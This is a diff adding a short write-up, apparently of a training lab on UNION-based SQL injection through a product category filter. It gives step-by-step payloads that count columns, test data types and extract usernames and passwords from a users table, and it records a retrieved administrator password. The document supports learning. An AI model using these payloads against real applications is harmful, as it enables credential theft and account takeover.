@@ -1,0 +1,36 @@
+SQL injection - product category filter
+
+Goals:
+1- retrieve all usernames and passwords
+2- log in as the administrator user
+
+Analysis:
+
+Step #1: Determine the number of columns
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--   ----> error
+the number of columns is 2
+
+Step #2: Determine the data type of the columns
+
+The Query: SELECT a, b FROM products WHERE category=''
+
+' UNION SELECT 'a', NULL--
+-> accept string data type
+
+' UNION SELECT NULL, 'a'--
+-> accept string data type
+
+Both columns accept string data type
+
+Step #3: get all the usernames and passwords
+
+' UNION SELECT username, password FROM users--
+
+Username: administrator
+Password: y2h0l1y5b2eig4t8kn0p
+
+Step #4: log in as the administrator user
+
+Solved
